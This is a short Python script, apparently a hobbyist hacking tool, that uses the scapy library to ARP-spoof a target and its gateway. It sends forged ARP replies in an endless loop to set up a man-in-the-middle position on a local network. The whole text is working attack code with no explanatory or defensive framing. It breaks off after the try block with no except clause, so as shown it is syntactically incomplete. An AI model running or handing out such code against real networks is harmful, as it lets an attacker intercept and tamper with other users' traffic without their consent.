import scapy.all as scapy
import time

cooldown = 5
ip_target = input("Enter target's IP address: ")
ip_gateway = input ("Enter gateway IP address: ")
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip),psrc = spoof_ip)
    scapy.send(packet, verbose=False)

try:
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(cooldown)
